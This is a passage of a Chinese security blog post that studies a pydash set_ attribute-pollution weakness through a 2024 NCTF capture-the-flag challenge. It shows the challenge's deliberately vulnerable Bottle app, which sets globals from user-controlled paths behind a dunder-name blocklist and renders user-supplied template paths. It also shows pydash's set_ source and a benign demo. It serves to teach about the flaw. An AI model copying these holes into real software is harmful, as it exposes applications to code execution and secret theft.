@@ -1,0 +1,442 @@
+<!doctype html><html lang=en-zh dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="该文章追溯分析了pydash的原型链污染漏洞"><title>Pydash set原型链污染漏洞解析</title>
+<link rel=canonical href=https://hadagaga.github.io/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="Pydash set原型链污染漏洞解析"><meta property='og:description' content="该文章追溯分析了pydash的原型链污染漏洞"><meta property='og:url' content='https://hadagaga.github.io/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/'><meta property='og:site_name' content='hadagaga blog'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Python'><meta property='article:tag' content='SSTI'><meta property='article:published_time' content='2025-04-08T00:00:00+00:00'><meta property='article:modified_time' content='2025-04-08T00:00:00+00:00'><meta property='og:image' content='https://hadagaga.github.io/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/cover.png'><meta name=twitter:title content="Pydash set原型链污染漏洞解析"><meta name=twitter:description content="该文章追溯分析了pydash的原型链污染漏洞"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://hadagaga.github.io/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/cover.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu6187617985535410037.png width=300 height=286 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>hadagaga blog</a></h1><h2 class=site-description>不要让时代的悲哀成为你的悲哀。</h2></div></header><ol class=menu-social><li><a href=https://github.com/hadagaga target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#前言>前言</a></li><li><a href=#2024-nctf>2024-nctf</a><ol><li><a href=#源码>源码</a></li><li><a href=#分析>分析</a></li><li><a href=#利用>利用</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/><img src=/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/cover_hu14709424613931794611.png srcset="/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/cover_hu14709424613931794611.png 800w, /p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/cover_hu10698298242800227106.png 1600w" width=800 height=231 loading=lazy alt="Featured image of post Pydash set原型链污染漏洞解析"></a></div><div class=article-details><header class=article-category><a href=/categories/cate1/ style=background-color:#2a9d8f;color:#fff>漏洞学习记录</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/>Pydash set原型链污染漏洞解析</a></h2><h3 class=article-subtitle>该文章追溯分析了pydash的原型链污染漏洞</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Apr 08, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 5 分钟</time></div></footer></div></header><section class=article-content><h2 id=前言>前言</h2><p>在nctf中遇到了一pydash的题目，是没见过的知识，所以写一篇文章复现分析一下。</p><h2 id=2024-nctf>2024-nctf</h2><h3 id=源码>源码</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>Hints: Flag在环境变量中
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>typing</span> <span class=kn>import</span> <span class=n>Optional</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pydash</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>bottle</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>__forbidden_path__</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;__annotations__&#39;</span><span class=p>,</span> <span class=s1>&#39;__call__&#39;</span><span class=p>,</span> <span class=s1>&#39;__class__&#39;</span><span class=p>,</span> <span class=s1>&#39;__closure__&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>               <span class=s1>&#39;__code__&#39;</span><span class=p>,</span> <span class=s1>&#39;__defaults__&#39;</span><span class=p>,</span> <span class=s1>&#39;__delattr__&#39;</span><span class=p>,</span> <span class=s1>&#39;__dict__&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>               <span class=s1>&#39;__dir__&#39;</span><span class=p>,</span> <span class=s1>&#39;__doc__&#39;</span><span class=p>,</span> <span class=s1>&#39;__eq__&#39;</span><span class=p>,</span> <span class=s1>&#39;__format__&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>               <span class=s1>&#39;__ge__&#39;</span><span class=p>,</span> <span class=s1>&#39;__get__&#39;</span><span class=p>,</span> <span class=s1>&#39;__getattribute__&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>               <span class=s1>&#39;__gt__&#39;</span><span class=p>,</span> <span class=s1>&#39;__hash__&#39;</span><span class=p>,</span> <span class=s1>&#39;__init__&#39;</span><span class=p>,</span> <span class=s1>&#39;__init_subclass__&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>               <span class=s1>&#39;__kwdefaults__&#39;</span><span class=p>,</span> <span class=s1>&#39;__le__&#39;</span><span class=p>,</span> <span class=s1>&#39;__lt__&#39;</span><span class=p>,</span> <span class=s1>&#39;__module__&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>               <span class=s1>&#39;__name__&#39;</span><span class=p>,</span> <span class=s1>&#39;__ne__&#39;</span><span class=p>,</span> <span class=s1>&#39;__new__&#39;</span><span class=p>,</span> <span class=s1>&#39;__qualname__&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>               <span class=s1>&#39;__reduce__&#39;</span><span class=p>,</span> <span class=s1>&#39;__reduce_ex__&#39;</span><span class=p>,</span> <span class=s1>&#39;__repr__&#39;</span><span class=p>,</span> <span class=s1>&#39;__setattr__&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>               <span class=s1>&#39;__sizeof__&#39;</span><span class=p>,</span> <span class=s1>&#39;__str__&#39;</span><span class=p>,</span> <span class=s1>&#39;__subclasshook__&#39;</span><span class=p>,</span> <span class=s1>&#39;__wrapped__&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>               <span class=s2>&#34;Optional&#34;</span><span class=p>,</span><span class=s2>&#34;func&#34;</span><span class=p>,</span><span class=s2>&#34;render&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>               <span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>__forbidden_name__</span><span class=o>=</span><span class=p>[</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;bottle&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>__forbidden_name__</span><span class=o>.</span><span class=n>extend</span><span class=p>(</span><span class=nb>dir</span><span class=p>(</span><span class=nb>globals</span><span class=p>()[</span><span class=s2>&#34;__builtins__&#34;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>setval</span><span class=p>(</span><span class=n>name</span><span class=p>:</span><span class=nb>str</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span><span class=nb>str</span><span class=p>,</span> <span class=n>value</span><span class=p>:</span><span class=nb>str</span><span class=p>)</span><span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>bool</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>name</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;__&#34;</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>0</span><span class=p>:</span> <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=n>__forbidden_name__</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>name</span><span class=o>==</span><span class=n>word</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=n>__forbidden_path__</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>path</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>word</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>0</span><span class=p>:</span> <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=n>obj</span><span class=o>=</span><span class=nb>globals</span><span class=p>()[</span><span class=n>name</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>pydash</span><span class=o>.</span><span class=n>set_</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=n>path</span><span class=p>,</span><span class=n>value</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@bottle.post</span><span class=p>(</span><span class=s1>&#39;/setValue&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>set_value</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=n>bottle</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>query</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>path</span><span class=o>=</span><span class=n>bottle</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>path</span><span class=p>,</span><span class=nb>str</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;no&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>name</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>6</span> <span class=ow>or</span> <span class=nb>len</span><span class=p>(</span><span class=n>path</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>32</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;no&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>value</span><span class=o>=</span><span class=n>bottle</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;value&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;yes&#34;</span> <span class=k>if</span> <span class=n>setval</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=n>value</span><span class=p>)</span> <span class=k>else</span> <span class=s2>&#34;no&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@bottle.get</span><span class=p>(</span><span class=s1>&#39;/render&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>render_template</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>path</span><span class=o>=</span><span class=n>bottle</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>query</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>path</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;{&#34;</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>0</span> <span class=ow>or</span> <span class=n>path</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;}&#34;</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>0</span> <span class=ow>or</span> <span class=n>path</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>)</span><span class=o>&gt;=</span><span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Hacker&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>bottle</span><span class=o>.</span><span class=n>template</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>bottle</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>8999</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=分析>分析</h3><p>我们拿到附件的源码。可以看到这里有两个关键的路由<code>/setValue</code>和<code>/render</code>，既然是要分析原型链污染，那么我们就主要关注</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pydash</span><span class=o>.</span><span class=n>set_</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=n>path</span><span class=p>,</span><span class=n>value</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>这个调用，追溯一下。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>set_</span><span class=p>(</span><span class=n>obj</span><span class=p>:</span> <span class=n>T</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span> <span class=n>PathT</span><span class=p>,</span> <span class=n>value</span><span class=p>:</span> <span class=n>t</span><span class=o>.</span><span class=n>Any</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>T</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    Sets the value of an object described by `path`. If any part of the object path doesn&#39;t exist,
+</span></span></span><span class=line><span class=cl><span class=s2>    it will be created.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    Args:
+</span></span></span><span class=line><span class=cl><span class=s2>        obj: Object to modify.
+</span></span></span><span class=line><span class=cl><span class=s2>        path: Target path to set value to.
+</span></span></span><span class=line><span class=cl><span class=s2>        value: Value to set.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    Returns:
+</span></span></span><span class=line><span class=cl><span class=s2>        Modified `obj`.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    Warning:
+</span></span></span><span class=line><span class=cl><span class=s2>        `obj` is modified in place.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    Example:
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>        &gt;&gt;&gt; set_(</span><span class=si>{}</span><span class=s2>, &#34;a.b.c&#34;, 1)
+</span></span></span><span class=line><span class=cl><span class=s2>        {&#39;a&#39;: {&#39;b&#39;: {&#39;c&#39;: 1}}}
+</span></span></span><span class=line><span class=cl><span class=s2>        &gt;&gt;&gt; set_(</span><span class=si>{}</span><span class=s2>, &#34;a.0.c&#34;, 1)
+</span></span></span><span class=line><span class=cl><span class=s2>        {&#39;a&#39;: {&#39;0&#39;: {&#39;c&#39;: 1}}}
+</span></span></span><span class=line><span class=cl><span class=s2>        &gt;&gt;&gt; set_([1, 2], &#34;[2][0]&#34;, 1)
+</span></span></span><span class=line><span class=cl><span class=s2>        [1, 2, [1]]
+</span></span></span><span class=line><span class=cl><span class=s2>        &gt;&gt;&gt; set_(</span><span class=si>{}</span><span class=s2>, &#34;a.b[0].c&#34;, 1)
+</span></span></span><span class=line><span class=cl><span class=s2>        {&#39;a&#39;: {&#39;b&#39;: [{&#39;c&#39;: 1}]}}
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    .. versionadded:: 2.2.0
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    .. versionchanged:: 3.3.0
+</span></span></span><span class=line><span class=cl><span class=s2>        Added :func:`set_` as main definition and :func:`deep_set` as alias.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    .. versionchanged:: 4.0.0
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>        - Modify `obj` in place.
+</span></span></span><span class=line><span class=cl><span class=s2>        - Support creating default path values as ``list`` or ``dict`` based on whether key or index
+</span></span></span><span class=line><span class=cl><span class=s2>          substrings are used.
+</span></span></span><span class=line><span class=cl><span class=s2>        - Remove alias ``deep_set``.
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>set_with</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=n>value</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>大体作用就是传入一个对象obj，一个path属性名以及一个value值。就可以改掉obj对象中的path属性的值。示例如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pydash</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Test</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>name</span> <span class=o>=</span> <span class=s2>&#34;test&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>score</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=n>Test</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;修改前</span><span class=si>{</span><span class=n>a</span><span class=o>.</span><span class=n>name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>pydash</span><span class=o>.</span><span class=n>set_</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=s2>&#34;name&#34;</span><span class=p>,</span> <span class=s2>&#34;test2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;修改后</span><span class=si>{</span><span class=n>a</span><span class=o>.</span><span class=n>name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
